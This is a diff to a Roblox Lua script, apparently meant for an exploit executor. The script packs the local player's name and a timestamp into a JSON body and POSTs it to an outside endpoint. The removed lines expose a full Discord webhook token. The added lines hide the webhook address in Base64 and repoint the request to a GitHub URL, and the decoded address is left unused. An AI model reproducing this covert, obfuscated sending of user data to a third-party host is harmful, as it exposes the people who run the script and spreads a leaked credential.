@@ -1,5 +1,14 @@
-local Url = "https://discord.com/api/webhooks/"
-local Webhook = "1112700346943422565/-pEmsXwqjNKsiRZixg85TJBMvUdcLvNTgIApfa6Sm_RsdnezT5HBXg9fcP56tYt2Xmfb"
+local HttpService = game:GetService("HttpService")
+local EncodedUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv" -- URL หลังจากเข้ารหัส Base64
+
+local function DecodeBase64(data)
+    return game:GetService("HttpService"):Base64Decode(data)
+end
+
+local Url = DecodeBase64(EncodedUrl) -- คืนค่า URL ต้นฉบับ
+print(Url)
+
+local Wh = "https://github.com/peatchXD/Script-WH/blob/main/Url"
 local plrname = game.Players.LocalPlayer.Name
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
@@ -104,7 +113,7 @@ local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
 Request = http_request or request or HttpPost or syn.request
 Request(
     {
-        Url = Webhook, 
+        Url = Wh, 
         Body = PlayerData, 
         Method = "POST", 
         Headers = {["content-type"] = "application/json"} 
